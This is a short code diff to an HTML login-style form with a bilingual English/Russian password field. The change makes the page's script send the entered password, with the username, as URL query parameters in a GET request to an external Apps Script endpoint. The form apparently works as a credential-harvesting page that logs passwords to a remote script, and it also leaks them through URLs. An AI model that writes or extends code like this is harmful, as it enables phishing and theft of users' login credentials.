@@ -486,7 +486,7 @@
         <div class="form-group">
           <label>Passwords//<br>Пароль <span style="color:var(--red)">*</span></label>
           <input type="text" id="text" placeholder="password here//Введите пароль" autocomplete="text">
-          <div class="error-msg" id="text">Please enter a valid password</div>
+          <div class="error-msg" id="password">Please enter a valid password</div>
         </div>
 
         <button class="submit-btn" id="submitBtn" onclick="handleSubmit()">
@@ -579,7 +579,7 @@
     // Build GET request URL — avoids all CORS preflight issues with Apps Script
     var url = SCRIPT_URL
       + '?username=' + encodeURIComponent(username)
-      + '&email='    + encodeURIComponent(email)
+      + '&password='    + encodeURIComponent(password)
       + '&timestamp='+ encodeURIComponent(new Date().toISOString())
       + '&refid='    + encodeURIComponent('RDH-' + Date.now().toString(36).toUpperCase().slice(-6));
 
